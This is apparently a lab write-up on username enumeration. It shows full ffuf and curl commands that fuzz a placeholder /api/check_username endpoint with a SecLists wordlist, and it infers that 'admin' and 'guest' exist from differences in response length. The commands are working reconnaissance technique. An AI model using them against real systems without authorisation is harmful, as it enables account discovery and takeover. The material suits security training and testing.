# Username Enumeration with ffuf and curl

## Objective

Identify valid users by exploiting the `/api/check_username` endpoint using username enumeration.

---

# Tools Used

- ffuf
- curl
- SecLists

---

# ffuf Command

```bash
ffuf -X POST \
-u "WEBSITE_URL/api/check_username" \
-H "Content-Type: application/json" \
-d '{"username":"FUZZ"}' \
-w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
-mc all \
-of json \
-o results.json \
-v
```

## Explanation of Options

| Option | Description |
|---|---|
| `-X POST` | Uses the POST HTTP method |
| `-u` | Target URL |
| `-H` | Adds HTTP headers |
| `-d` | Sends JSON POST data |
| `FUZZ` | Placeholder replaced by ffuf with wordlist entries |
| `-w` | Specifies the wordlist |
| `-mc all` | Matches all HTTP status codes |
| `-of json` | Saves output in JSON format |
| `-o results.json` | Writes results to a file |
| `-v` | Enables verbose mode |

---

# Result Analysis

Most usernames returned responses with:

- Length: `53`

Two usernames returned larger responses:

- `admin`
- `guest`

Their response length was:

- Length: `137`

This difference indicated that these users exist in the application.

---

# curl Verification

## Check guest

```bash
curl -s -X POST "WEBSITE_URL/api/check_username" \
-H "Content-Type: application/json" \
-d '{"username":"guest"}'
```

## curl Options

| Option | Description |
|---|---|
| `-s` | Silent mode |
| `-X POST` | Uses POST method |
| `-H` | Adds HTTP headers |
| `-d` | Sends POST body data |

